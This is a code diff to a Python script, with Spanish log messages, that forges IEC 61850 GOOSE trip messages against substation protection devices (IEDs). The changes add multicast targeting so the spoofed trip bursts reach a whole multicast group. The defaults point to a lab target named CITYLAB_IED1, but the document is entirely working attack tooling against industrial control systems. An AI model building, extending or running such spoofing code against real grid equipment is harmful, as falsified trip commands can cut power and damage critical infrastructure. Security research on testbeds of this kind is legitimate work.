@@ -32,6 +32,16 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s][GOOSE-SPOOF] %(mes
 LOGGER = logging.getLogger('attack_goose_spoofing')
 
 
+def is_multicast_addr(addr: Optional[str]) -> bool:
+    if not addr:
+        return False
+    try:
+        first_octet = int(addr.split('.')[0])
+        return 224 <= first_octet <= 239
+    except Exception:
+        return False
+
+
 def spoof_goose_trip(
     target_host: str = '127.0.0.1',
     target_port: int = DEFAULT_GOOSE_PORT,
@@ -53,6 +63,12 @@ def spoof_goose_trip(
     )
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    if is_multicast_addr(target_host):
+        try:
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
+        except OSError:
+            pass
     try:
         sock.sendto(pdu, (target_host, target_port))
         LOGGER.info(
@@ -70,13 +86,16 @@ def main(argv: Optional[Sequence[str]] = None) -> int:
     parser.add_argument("--port", type=int, default=DEFAULT_GOOSE_PORT, help=f"Puerto UDP GOOSE (default: {DEFAULT_GOOSE_PORT})")
     parser.add_argument("--ied", default="CITYLAB_IED1", help="Nombre del IED objetivo (default: CITYLAB_IED1)")
     parser.add_argument("--stnum", type=int, default=100, help="Número de estado falsificado stNum (default: 100)")
+    parser.add_argument("--multicast", action="store_true", help=f"Envía paquete a dirección UDP Multicast ({MULTICAST_GOOSE_ADDR})")
     parser.add_argument("--burst", type=int, default=5, help="Número de ráfagas GOOSE a transmitir (default: 5)")
     args = parser.parse_args(argv)
 
-    LOGGER.info("Iniciando vector de ataque GOOSE Spoofing contra subestación eléctrica...")
+    target_host = MULTICAST_GOOSE_ADDR if args.multicast else args.host
+
+    LOGGER.info("Iniciando vector de ataque GOOSE Spoofing contra subestación eléctrica (%s:%d)...", target_host, args.port)
     for i in range(args.burst):
         spoof_goose_trip(
-            target_host=args.host,
+            target_host=target_host,
             target_port=args.port,
             ied_name=args.ied,
             st_num=args.stnum + i,
